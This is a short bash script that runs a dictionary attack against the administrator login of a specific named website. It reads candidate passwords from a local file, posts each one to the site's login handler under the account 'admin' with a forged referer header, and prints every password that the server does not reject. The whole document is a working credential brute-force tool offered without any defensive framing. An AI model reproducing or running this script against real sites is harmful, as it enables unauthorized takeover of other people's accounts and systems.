#!/bin/bash
passFile=./pass.txt

cat $passFile | while read line; do
	data=$(curl --referer http://gms.traingo.cn/login.aspx --data "active=login&txtAccount=admin&txtPassword=$line" http://gms.traingo.cn/ajax/login.ashx 2>/dev/null)
	if [ "$data" == '0' ]; then
		echo "."
	else
		echo "$line"
	fi
done